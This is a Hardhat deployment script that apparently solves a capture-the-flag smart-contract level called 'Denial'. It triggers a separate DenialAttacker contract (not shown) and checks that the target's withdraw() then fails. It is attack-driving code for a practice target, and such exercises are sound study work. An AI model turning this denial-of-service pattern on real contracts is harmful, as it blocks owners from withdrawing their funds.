import { ethers, network } from "hardhat";
import { Denial, DenialAttacker } from "../typechain-types";

async function main() {
  let denial: Denial;
  const [deployer] = await ethers.getSigners();

  const chainId = network.config.chainId;

  const isLocalTest = chainId === 31337;

  const denialAttacker: DenialAttacker = await ethers.getContract(
    "DenialAttacker"
  );

  if (isLocalTest) {
    denial = await ethers.getContract("Denial");

    await deployer.sendTransaction({
      to: denial.address,
      value: 1000000000000000,
      gasLimit: 8000000,
    });
  } else {
    denial = await ethers.getContractAt(
      "Denial",
      "0x0bB3f55f6d63D28caB5F29b5b541631c0e212317"
    );
  }

  let initialBalance = await denial.contractBalance();

  async function check() {
    const currentBalance = await denial.contractBalance();
    console.log(initialBalance.toString());
    console.log(currentBalance.toString());
    console.log(initialBalance.toString() == currentBalance.toString());
  }

  console.log("Before the attack:");

  await check();

  const tx = await denialAttacker.attack();

  await tx.wait(isLocalTest ? 1 : 5);

  try {
    const txWithdraw = await denial.withdraw({
      gasLimit: 1000000,
    });
    txWithdraw.wait(isLocalTest ? 1 : 5);
  } catch (error) {
    console.log("fail successfully");
  }

  console.log("-------------------------------------------------------");
  console.log("After the attack:");

  await check();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
